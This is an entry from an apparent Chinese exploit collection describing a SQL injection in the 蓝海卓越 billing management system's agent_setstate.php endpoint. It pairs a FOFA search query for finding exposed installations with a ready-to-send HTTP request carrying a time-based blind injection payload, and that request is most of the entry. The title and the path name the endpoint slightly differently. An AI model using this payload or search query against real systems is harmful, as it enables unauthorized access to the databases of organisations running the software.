---
fofa: "title=="
source: "wy876 漏洞文库"
---

# 蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

# 一、漏洞简介
蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


# 四、漏洞复现
```plain
GET /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep(3),1)))uQqn) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Length: 161
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgkwcrdalag9xge0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
